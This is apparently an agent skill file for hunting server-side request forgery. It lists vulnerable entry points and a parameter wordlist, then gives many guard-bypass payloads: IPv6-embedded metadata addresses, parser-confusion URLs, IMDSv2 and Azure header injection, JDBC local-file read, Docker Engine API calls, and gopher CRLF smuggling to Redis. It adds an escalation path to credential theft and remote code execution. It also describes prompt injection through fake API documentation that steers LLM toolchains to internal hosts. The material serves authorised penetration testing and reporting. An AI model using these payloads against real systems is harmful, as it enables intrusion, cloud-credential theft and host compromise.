---
name: hunt-ssrf
description: Full SSRF workflow in three parts — finding SSRF entry points in a target (Part 1: discovery), advanced guard-bypass techniques beyond basic IP-encoding tricks (Part 2: bypasses — IPv6 transition addresses/NAT64/6to4/Teredo, 0.0.0.0/[::] loopback aliasing, parser differentials, non-IP internal hostnames like host.docker.internal/*.svc, allowlist startsWith()/userinfo bypasses, CDN edge path-normalization, service-mesh/Istio jwksUri, IMDSv2/Azure Metadata header injection, half-blind SSRF, forwarded-header URL reconstruction, JDBC/Redis/Mongo connection-string SSRF, Docker Engine API targets, gopher CRLF smuggling, static DNS CNAME-to-metadata), and source-review methodology (Part 3, detailed in references/methodology.md — request-path/data-flow modeling, sink inventory, evidence-confidence grading E0-E5, agentic/MCP tool inventories, and verified 2025-2026 CVEs like CodeWhale/CVE-2026-45310, LMDeploy/CVE-2026-33626, Angular/CVE-2026-50168, LangChain/CVE-2026-26019+27795, pyLoad/CVE-2026-48737, PraisonAI/CVE-2026-57126, and the MCP fetch IPv6 site-local advisory). Use this skill whenever hunting for SSRF on a target, reviewing source for SSRF, or testing/triaging an SSRF finding — especially when a target's guard already blocks the "obvious" payloads and a bypass or a stronger evidence bar is needed.
---

# SSRF Discovery and Advanced Bypass Tricks

A two-part reference: **Part 1** is how to find places in a target where SSRF might exist and confirm it; **Part 2** is bypass techniques that go beyond the basic IP-encoding tricks most guards already block (decimal/octal/hex IP, `[::ffff:127.0.0.1]`, `0x7f.1`, etc). Use Part 1 when hunting for SSRF entry points on a target; use Part 2 when a target's SSRF filter survives the obvious payloads, or when deciding how far a confirmed blind SSRF can be escalated.

**Core principle, applies throughout:** OOB (out-of-band, e.g. Burp Collaborator / interactsh) confirmation is mandatory before reporting blind SSRF. Part 2 is about what to try *after* you have a URL-fetching primitive, and how far to push it once OOB confirms the request fired.

---

# Part 1 — SSRF Discovery

## 1.1 Where to look: functionality that makes outbound requests

Any feature where the server fetches a resource on the app's behalf is a candidate. Work through the app systematically and flag these:

- **URL-accepting parameters** — anything that takes a URL, link, image, file, or "source" and the server fetches it: avatar/profile-picture-by-URL, "import from URL", RSS/feed readers, link unfurling/preview (Slack-style), webhooks (both registering a webhook URL and features that "test" one), PDF/document generators that accept a URL or render HTML with remote resources, screenshot/thumbnail services, SSO/SAML metadata URL fields, OAuth `redirect_uri`/discovery endpoints, "share this page" or social-card generators.
- **File upload/import pipelines** that fetch remote content: SVG/image processors that resolve external entities or `xlink:href`, document converters (DOCX/PDF) that follow embedded remote references, CSV/data importers with a "from URL" option, API integrations ("connect your data source", "test connection" for a DB/cache/webhook target — see Part 2 §11).
- **Hidden/indirect fetchers** — things that don't look like "enter a URL" but still trigger a server-side request: XML parsers (XXE → SSRF via external entities), server-side templating that resolves includes, PDF renderers executing JS/CSS that references external URLs, markdown/wiki renderers that fetch remote images for caching, "report a broken link"/URL validators, OpenGraph/metadata scrapers, webhooks for CI/CD or issue trackers, cloud/edge functions that proxy a user-supplied URL (see Part 2 §15), LLM/agent toolchains where a tool fetches a URL from model output or from untrusted "documentation" (prompt-injection-driven SSRF, see Part 2 §4–5).
- **Multi-tenant/cloud-native surfaces** — service mesh control planes (Istio `jwksUri`, see Part 2 §7), Kubernetes admission webhooks, CI pipeline integrations, Docker/container platforms with management APIs (Part 2 §12).

## 1.2 Parameter name wordlist

When fuzzing for hidden SSRF-prone parameters (e.g. with Arjun or a Burp Intruder pass against a known endpoint), common names include:
```
url, uri, link, href, src, source, target, dest, destination, redirect,
redirect_uri, return, returnTo, next, continue, callback, callback_url,
webhook, webhook_url, feed, rss, path, file, filename, filepath, folder,
host, hostname, domain, port, ip, address, proxy, fetch, load, import,
api_url, endpoint, service_url, data, reference, document, avatar, image,
image_url, thumbnail, preview, media, download, upload_url, out, to, page
```

## 1.3 Confirming via OOB — and classifying the response

1. Replace the candidate parameter with an interactsh/Collaborator (or similarly controlled) domain. A DNS lookup confirms resolution happened; an HTTP hit confirms the full request fired.
2. Once confirmed, classify what you have:
   - **Full-read SSRF** — the response body (or part of it) is reflected back to you. Highest value: can read internal services/metadata directly.
   - **Blind SSRF** — the request fires (OOB confirms it) but nothing comes back in the response. Still exploitable (port scanning via timing/error differences, protocol smuggling, write-only targets like Redis), and don't give up on it — check Part 2 §9 for "half-blind" channels (errors, async events, rendered documents) before concluding it's pure blind.
3. Differentiate timing responses even without OOB: a closed port, a filtered port, and an open-but-non-HTTP port (e.g. Redis, Memcached) often each produce a distinguishable error message or response time — useful for internal port scanning once you have any SSRF primitive, blind or not.
4. Test redirect-based bypasses early: if the app validates the URL you supply but then follows redirects, host an endpoint that 302s to your actual internal target — this defeats allowlists/validators that only check the initial URL (and combines with Part 2 §8's HTTPS-requirement bypass).
5. Always test both HTTP and HTTPS variants, and try protocol smuggling (`gopher://`, `dict://`, `file://`, `ftp://`) if the fetcher is a generic library (curl, Guzzle, requests) rather than a hardened HTTP-only client — these open up Redis/Memcached/SMTP interaction (see Part 2 §13) and local file read (`file:///etc/passwd`).

## 1.4 First payloads to try (before reaching for Part 2)

Confirm the guard exists and see what it actually blocks before escalating to advanced bypasses:
```
http://127.0.0.1/
http://localhost/
http://169.254.169.254/latest/meta-data/
http://[::1]/
http://metadata.google.internal/computeMetadata/v1/
```
If any of these work outright, you likely don't need Part 2 at all. If they're all blocked, move to Gate 0 below and start working through the bypass vectors.

---

# Part 2 — Advanced Bypass Tricks

## Gate 0 — baseline checks before reaching for exotic bypasses

Before trying any vector below, check:

1. Does the guard parse the URL at the same layer/parser as the actual fetcher? If the parameter passes through any decoding or normalization before the fetch (path-segment base64, double URL-encoding, JSON nesting, a `normalize()`-style helper), test host resolution under at least two decode passes — validator and fetcher disagreeing on the host is the root cause of several 2025 CVEs (§3).
2. Does the guard's "private IP" definition include IPv6 transition addresses, `0.0.0.0`, `::`, and link-local — not just `127.0.0.0/8`, `::1`, and RFC1918? Most guards only check the first set (§1, §2).
3. If the HTTP response body isn't returned to you, does the target content leak elsewhere — error messages, async job/event objects, logs, or a rendered PDF/image? Don't classify a request as "pure blind" just because the body is empty (§9).
4. Are custom request headers controllable (webhook tester, API debugger, integration config)? If so, IMDSv2 and Azure's `Metadata: true` requirement may not actually be a protection (§8).

## 1. IPv6 transition addresses embedding internal IPv4

Guards that only recognize `::ffff:`, `fe80::`, and `::1` miss IPv4 embedded in transition prefixes. On a NAT64/DNS64 network (common in IPv6-only/IPv6-first cloud environments), these look like "public IPv6" to `is_private()`/`is_global()` checks but the network stack routes them to the embedded private IPv4 target.

```
# NAT64 embedding 169.254.169.254
http://[64:ff9b::a9fe:a9fe]/
# 6to4 embedding 127.0.0.1
http://[2002:7f00:0001::]/
# Teredo (client IPv4 XORed with 0xFFFFFFFF in last 32 bits)
http://[2001:0000:...]/
```
Bypassed ToolHive, TREK, and others this way.

## 2. 0.0.0.0 and [::] — unspecified addresses that resolve to loopback

On Linux, `0.0.0.0` as a destination routes to local loopback, and `[::]` routes to `[::1]`. Most guards check `127.0.0.0/8`/`localhost` but not `0.0.0.0/8` or `::/128` — the guard's threat model is "block loopback," but these are classified as *unspecified*, not loopback, while behaving as loopback.

```
http://0.0.0.0:8080/
http://[::]:8080/
http://0:0:0:0:0:0:0:0/
```
Real cases: new-api stayed bypassable via `0.0.0.0` after CVE-2025-59146/62155 fixes; imgproxy CVE-2025-24354 still reached localhost via `0.0.0.0` even with loopback blocking enabled; local-deep-research missed `::`, `0::`, `::0` variants entirely.

## 3. Parser differentials (validator vs. fetcher disagree on the host)

**3.1 Backslash/control-byte confusion.** `urllib.parse.urlparse` and `urllib3`/`requests` parse `http://127.0.0.1\@1.1.1.1` differently — one extracts `1.1.1.1` (passes validation), the other connects to `127.0.0.1`. Fix is to reject backslashes/control bytes/whitespace and extract the host with the *same* parser the HTTP client uses.
```
http://127.0.0.1\@attacker.com/
http://127.0.0.1%09@attacker.com/
http://127.0.0.1%00.attacker.com/
```
**3.2 Percent-encoded host / normalize() bugs.** Same bug class as CVE-2025-1211 but in different functions (e.g. Hackney's `hackney_url:normalize/2`). Don't stop at one `url=` form — test the host under multiple decode passes if the param goes through any pre-processing.

## 4. Non-IP internal hostnames (no private-IP octets at all)

Guards that are purely IP-regex-based miss these entirely:
- `host.docker.internal` — reaches the Docker host from a container
- `kubernetes.default.svc` — in-cluster K8s API DNS name
- `*.internal` / `*.corp` / `*.local` — enterprise internal DNS suffixes
- `metadata.google.internal` — GCP metadata short name (often ignored even when `169.254.169.254` is blocked)

Exploited via Apify MCP's `fetch-apify-docs` and FlowiseAI's API-chain component, where attacker-supplied fake "API documentation" (via prompt injection) set a `BASE URL:` redirecting to `host.docker.internal:8080` or an internal `.local` host. Most hunters stop after `169.254.169.254` and never try these — in containerized/orchestrated environments they're often *less* filtered than IPs.

## 5. Allowlist string-prefix bypasses

For naive checks like `ALLOWED_DOMAINS.some(d => url.startsWith(d))`:
```
# Suffix injection
https://docs.trusted.com.evil.com/payload
# Userinfo injection — trusted domain appears before @, real target is after
https://docs.trusted.com@evil.com/payload
```
Increasingly seen in LLM toolchains/API chains, where prompt injection forges "documentation" to steer a `BASE URL` rather than directly controlling a URL parameter.

## 6. CDN/edge path-normalization bypasses

Edge platforms (Cloudflare Workers, Vercel Edge, Netlify Functions) can normalize URLs differently from the origin — a path segment the edge treats as a static asset gets re-normalized by the origin into an external request. Example: OpenNext's `@opennextjs/cloudflare` `/cdn-cgi/image/` handler.
```
https://victim-site.com/cdn-cgi/image/aaaa/https://attacker.com/...
```
Same class as `;/` and `/../` path-confusion, but the carrier is the edge's image/resize handler. When the target runs on an edge platform, test the edge handler path itself, not just app-layer params.

## 7. Service mesh: Istio jwksUri and Envoy header leakage

**7.1 Istio `RequestAuthentication.jwksUri`.** When a `RequestAuthentication` resource's `jwksUri` points internally, `istiod` makes an unauthenticated GET with no localhost/link-local filtering, and the result can be distributed via xDS to every sidecar in the mesh.
```yaml
jwksUri: http://169.254.169.254/latest/meta-data/iam/security-credentials/
```
**7.2 Envoy metadata leakage.** Headers like `x-envoy-peer-metadata`, `x-envoy-peer-metadata-id`, or `server: envoy` on a blind SSRF response confirm you've entered an Istio mesh and leak Pod/service identity. If policy allows the final hop, probe `/config_dump` to pull full mesh config (routes, clusters, secrets).

## 8. Bypassing IMDSv2 / Azure Metadata via header injection

IMDSv2 normally requires a PUT for a token then `X-aws-ec2-metadata-token`. CVE-2025-64709 (Typebot) bypassed this where a webhook/HTTP-request component let the attacker control arbitrary headers — the attacker just injected the token header directly and pulled the EKS node role's IAM credentials, leading to cluster takeover. Azure IMDS needs `Metadata: true`; the ChatGPT Custom Actions SSRF named an attacker-controlled API-key header `Metadata` with value `true`, combined with a 302 redirect to bypass the HTTPS requirement. **Generalize:** any feature allowing arbitrary outbound headers (webhook tester, API debugger, integration config) may neutralize IMDSv2/Azure protections.

## 9. Half-blind SSRF — response surfaces outside the body

Distinct from the blind/full-read binary: the HTTP body isn't returned, but content leaks via error messages, async event objects, logs, or a rendered document.
- CVE-2025-13281 (Kubernetes Portworx): `kube-controller-manager`'s GET response leaked into a `ProvisioningFailed` event object — attacker couldn't control the request body but could read the response.
- PDF/rendering pipelines that execute JS can draw internal response content into the returned PDF/image — the document becomes the exfil channel.

When the body comes back empty, check: does an error echo internal-response fragments? Do `kubectl get events` show the provisioner's response? Does a returned PDF/image contain internal text?

## 10. Forwarded-header URL reconstruction

Astro's `createRequest()` builds URLs from unsanitized `x-forwarded-proto`/`x-forwarded-port`. Injecting a protocol-layer payload rewrites the whole URL (host/port/path) while stuffing the real host/path into the query string, so routing looks unaffected:
```
x-forwarded-proto: https://www.malicious-url.com/?tank=
# constructed: https://www.malicious-url.com/?tank=://localhost/ssr
```
This doubles as a middleware/protected-route bypass and a cache-poisoning vector. Applies to any SSR framework building URLs from `X-Forwarded-*` headers (Astro, Next.js, Nuxt, Remix) — test these headers as SSRF vectors, not just `?url=`.

## 11. Connection-string SSRF (JDBC/Redis/Mongo/LDAP) with file-read escalation

Any "test connection"/"data source config" feature accepting JDBC/Redis/Mongo/LDAP URLs is a blind-SSRF + potential file-read dual vector. Dinky (≤1.2.5) and SpringBlade's `testConnect`: attacker supplies a MySQL JDBC URL, probes internal hosts/ports via driver error timing (SSRF/port-scan), then sets `allowLoadLocalInfile=true` to abuse `LOAD DATA LOCAL INFILE` and read arbitrary files (configs, private keys) off the app host:
```
jdbc:mysql://internal-host:3306/test?allowLoadLocalInfile=true
```

## 12. Docker Engine API as an internal SSRF target

Docker Desktop CVE-2025-9074 (CVSS 9.3): the Docker Engine API is reachable unauthenticated from inside a container at `http://192.168.65.7:2375/`, even with Enhanced Container Isolation on — enabling container creation and host filesystem access. Most SSRF port-scan lists only include `127.0.0.1`/`169.254.169.254`, not this address.
```
http://192.168.65.7:2375/containers/json
http://host.docker.internal:2375/version
```

## 13. Gopher CRLF smuggling (curl doesn't sanitize the selector)

curl's gopher implementation doesn't sanitize `%0d%0a` in the selector path, letting you inject arbitrary TCP commands into Redis/Memcached/SMTP even when the SSRF only allows gopher and the selector is assumed "safe":
```
gopher://127.0.0.1:11211/_Dummy%0d%0aHELLO_SERVER%0d%0a
```
Test whether CRLF in the selector decodes to raw bytes — on an old or curl-based HTTP client this can lead directly to Redis `CONFIG SET`/`SAVE`/`authorized_keys` writes → RCE.

## 14. Static DNS CNAME to metadata/internal (no rebinding race needed)

A simpler, more stable alternative to DNS-rebinding TOCTOU: register a CNAME pointing directly at a metadata IP or internal hostname.
```
attacker.com.       CNAME  metadata.google.internal.
evil.attacker.com.  A      169.254.169.254
```
If the guard resolves once and checks the IP, the CNAME returns the internal address on first resolution. If the guard checks the hostname string, the CNAME looks like a normal external domain. Try static CNAME before escalating to rebinding (TTL=0 + race).

## 15. Cloud/Edge Function: SSRF + cross-tenant write combo

Multi-tenant SaaS Edge Functions can have both an SSRF (fetch a user-supplied URL) and a cross-tenant write (store the result in an arbitrary workspace). Example: a Supabase-backed "zip my submission files" Edge Function fetched an attacker URL and wrote the archive into an arbitrary workspace's storage folder. When you find a URL input in a cloud/Edge Function, also check where the fetched result gets written — if that path is also user-controlled, blind SSRF escalates to cross-tenant data write/overwrite.

## Quick reference table

| Vector | Why hunters miss it | Minimal payload |
|---|---|---|
| NAT64/6to4/Teredo embedding IPv4 | Guards only check `::ffff:`/`fe80::` | `http://[64:ff9b::a9fe:a9fe]/` |
| `0.0.0.0` / `[::]` | Classed as unspecified, not loopback | `http://0.0.0.0:8080/` |
| Backslash/control-byte parser diff | Only IP encodings tested | `http://127.0.0.1\@attacker.com/` |
| `host.docker.internal`/`*.svc`/`*.internal` | Guards only block IP literals | `http://host.docker.internal:8080/` |
| `startsWith()` allowlist bypass | Only param values tested, not domain strings | `https://docs.trusted.com.evil.com/` |
| CDN edge `/cdn-cgi/image/` path confusion | Only app params tested | `https://victim.com/cdn-cgi/image/x/https://attacker.com/` |
| Istio `jwksUri` | Only app layer tested, not control-plane resources | `jwksUri: http://169.254.169.254/...` |
| IMDSv2/Azure header injection | Assumes IMDSv2 unbypassable | Webhook header named `Metadata`/`X-aws-ec2-metadata-token` |
| Half-blind (events/errors/documents) | Gives up when body is empty | Check `ProvisioningFailed` events / returned PDF |
| `x-forwarded-proto` URL rewrite | Only `?url=` tested, not headers | `x-forwarded-proto: https://evil.com/?x=` |
| JDBC `allowLoadLocalInfile` | Treats "test connection" as blind-only | `jdbc:mysql://...?allowLoadLocalInfile=true` |
| Docker `192.168.65.7:2375` | Port-scan lists omit Docker Desktop internal IP | `http://192.168.65.7:2375/containers/json` |
| Gopher CRLF not sanitized | Assumes gopher selector is safe | `gopher://127.0.0.1:6379/_%0d%0aCONFIG...` |
| Static CNAME → metadata | Jumps straight to rebinding | `evil.com CNAME metadata.google.internal` |

---

# Part 3 — Methodology: Source Review and Evidence Grading

Part 1 finds the sink and Part 2 gets past the guard. Part 3 is for when you have source access (or want to reason like you do), and for judging whether your evidence is actually strong enough before you call something confirmed.

## 3.1 Model the request path (use for source review / white-box, or to reason about a black-box target)

For any candidate sink, trace the value end-to-end and ask these questions at each stage — don't mark a stage "safe" just because *a* check exists somewhere:

| Stage | Questions to answer |
|---|---|
| Input | Which field influences the destination? User-supplied, stored, imported, generated, or derived from retrieved/model content? |
| Transformation | Is it decoded, normalized, concatenated, templated, path-joined, or rewritten by an SDK before reaching the fetcher? |
| Parser | Which parser interprets scheme/host/port/path/userinfo? Does a *different* parser reinterpret it later (this is Part 2 §3)? |
| Policy | Is there a real destination/allowlist check, or only a UI hint / model instruction? |
| Resolver | Which resolver runs, are both A and AAAA answers considered, what happens on partial failure? |
| Connector | Does the connector actually use the address policy approved, or can a custom dispatcher/proxy re-resolve? |
| Redirects | Automatic or manual? Is each hop independently re-checked (Part 2 §8 territory)? |
| Response | Body, headers, status, timing, screenshot, PDF, or model-generated summary exposed back to you? |
| Execution | Immediate, queued, retried, scheduled, or delegated to another service identity (§3.6 below)? |

**The single highest-value question:** where is the last security decision before the network connection is actually made, and can anything downstream of it change the destination? Most real bypasses (Part 2 in full) live in the gap between that decision and the actual connect call.

## 3.2 Sink inventory template

When a target has several URL-accepting features, don't lump them together — log one row per distinct sink so you don't re-test the same guard twice or miss one that's implemented differently:

| Feature | Input | Trigger | Sink/library | Policy | Resolution | Redirects | Response | Identity | Evidence | Confidence |
|---|---|---|---|---|---|---|---|---|---|---|

- **Trigger**: immediate request, import job, queued/scheduled task, agent tool call, retry.
- **Identity**: anonymous user, your account, a service account, a worker role, or an agent/MCP identity — a sink that runs under a more privileged identity than the one you hold is a bigger finding even if the request itself is identical.
- **Confidence**: confirmed / probable / unverified / disproved — keep this honest as you go, don't let probable quietly become confirmed.

## 3.3 Evidence and confidence grading

Don't let OOB-fired-once collapse into "critical SSRF" without checking what tier of evidence you actually have:

| Level | Observation | What it actually proves |
|---|---|---|
| E0 — Reflection | Your value appears in a response/error | Input reflection only — not SSRF by itself |
| E1 — DNS | Your unique hostname resolves (DNS hit on Collaborator/interactsh) | Something resolved the hostname; HTTP fetch is *not* proven yet |
| E2 — HTTP callback | Your controlled endpoint gets an attributable HTTP hit | An HTTP-capable component made the outbound request |
| E3 — Response propagation | A marker from your controlled response reaches you back | Full-read SSRF — response propagation confirmed |
| E4 — Policy failure demonstrated | A restricted address/hostname you expected to be blocked is actually reached | Destination enforcement genuinely fails, not just "theoretically could" |
| E5 — Boundary/identity effect | You get cross-tenant data, a different service's credentials, or privilege you shouldn't have | The specific authorization boundary is broken |

**Insufficient on their own, don't report yet:** a validator merely accepting your string, a status-code/timing change with no independent attribution, a tool/agent *claiming* it fetched something, a DNS event you can't tie to your specific test input, or a callback with no unique per-test identifier. These read like evidence but aren't — get to at least E2 (ideally E3+) before writing anything up.

## 3.6 Non-HTTP protocol and parser side-effect checklist

Beyond gopher (Part 2 §13), check what protocols the actual fetch library supports, not just what the feature's UI implies:
- `file://` and local-resource handlers (local file read via a feature that only looks like it does HTTP)
- legacy `ftp://` handlers
- XML external entities / external document references (XXE escalating straight into SSRF)
- archive and media-library URL handlers that fetch nested resources
- custom SDK schemes and browser custom-protocol/embedded-resource handlers

A validator that only checks `http(s)://` doesn't mean the underlying library can't be reached with another scheme — test scheme handling explicitly as its own axis, separate from host/IP bypasses.

## 3.7 Expanded agentic/MCP tool inventory (complements Part 1 §1.1 and Part 2 §4–5)

When the target is agentic, inventory every tool that can cause network access, not just ones literally named `fetch`:

| Tool class | What to check |
|---|---|
| Direct fetch tool | Arbitrary URL/host reaches an HTTP client with no re-validation |
| Browser navigation tool | Main-frame AND subresource policy; screenshot/evaluation permissions separate from navigation |
| Document ingestion / RAG loader | Parser makes hidden secondary requests (remote images, XML includes) while "just" converting a doc |
| Search connector | Is the provider/base URL itself attacker-influenceable? |
| Workflow HTTP node | Stored destination + delayed worker execution — re-validated at run time or only at save time? |
| MCP server discovery/config | Does changing remote server metadata influence later connections? |
| Code-execution tool | Does the sandbox expose sockets/`requests`/`fetch` to generated code? |
| LLM media loader | `image_url`/`audio_url`/document references fetched by inference infra itself, before the model ever "does" anything |

Distinct trust boundaries worth testing independently: direct prompt vs. indirect instructions buried in a page/file/email/RAG chunk (prompt-injection-driven SSRF); UI validation vs. tool-adapter validation; one tool's output becoming a second tool's URL argument (tool chaining); your account's identity vs. a more privileged agent/service identity performing the actual fetch.

## 3.8 More verified 2025–2026 CVEs/advisories (add to Part 2's case list)

| Reference | Root-cause lesson |
|---|---|
| CVE-2026-45310 — CodeWhale/DeepSeek TUI | Initial URL was checked, but the client followed redirects without re-applying the destination policy (same pattern as Part 2 §8/§10's redirect gap) |
| CVE-2026-33626 — LMDeploy | Vision-language `image_url` loading path fetched remote URLs without adequate destination validation — confirms Part 1's "LLM media loader" sink class is real-world exploitable |
| CVE-2026-50168 — Angular `platform-server` | WHATWG `URL` and the lenient Domino parser disagreed during SSR, causing an allowlist bypass — textbook parser differential (Part 2 §3) |
| CVE-2026-26019 / CVE-2026-27795 — LangChain Community | Same-origin check used string-prefix comparison (Part 2 §5's `startsWith()` bypass) and a later fix was itself bypassed via redirects |
| CVE-2026-48737 — pyLoad-ng | Global-address classifier missed IPv6 transition-address cases — same class as Part 2 §1 (NAT64/6to4), reachability depends on the host's NAT64/6to4 routing |
| CVE-2026-57126 — PraisonAI | Literal-host checks ran before hostname resolution, leaving DNS-based destination validation incomplete |
| GHSA-3rxj-6jhw-qfv7 — MCP `mcp-server-fetch` (2026-11-11) | IPv6 site-local (`fec0::/10`) classification gap in the fetch guard; note the advisory itself rates practical reachability as low on default hosts — don't overclaim this one without independent reachability evidence |

**Research hygiene:** always reopen the vendor advisory before citing affected/fixed versions in a live report — CNA, NVD, and vendor release notes can disagree, and advisory details get superseded.

## 3.9 Address-classification details worth remembering (complements Part 2 §1–2)

- A hostname can resolve to a mix of public and non-public A/AAAA answers — policy must evaluate the *complete* answer set, not approve the hostname just because one answer looked public.
- The core TOCTOU bug: the app checks one resolved address, then the HTTP stack resolves the hostname *again* at connect time. A correct implementation pins the already-approved address to the actual connect call rather than re-resolving — when you see a guard that does "DNS check, then pass the hostname to a normal HTTP client," that's a strong signal a DNS-rebinding or redirect-based (Part 2 §8/§14) bypass is possible.

---

## How to use this during an engagement

1. Confirm the obvious payloads are actually blocked (don't assume — test `127.0.0.1`, `localhost`, `169.254.169.254`, `[::1]` first).
2. Work through Gate 0's four questions against the guard's actual implementation (source review if available — use Part 3 §3.1's path model — black-box inference otherwise).
3. Pick vectors matching the target's stack: containerized → §4/§12; SSR framework → §10; edge/CDN-fronted → §6; service mesh → §7; "test connection" feature → §11; webhook/custom-header feature → §8; agentic/MCP → Part 3 §3.7.
4. Always get OOB confirmation (Collaborator/interactsh) before reporting, even for these advanced vectors — and grade what tier of evidence (Part 3 §3.3) that confirmation actually gives you before calling it confirmed.
5. Once OOB confirms the request fires, check §9 and §15 logic to see whether it escalates past "the server requested my URL" into credential theft, internal data read, or RCE — that's what separates a low/medium SSRF from a critical one.
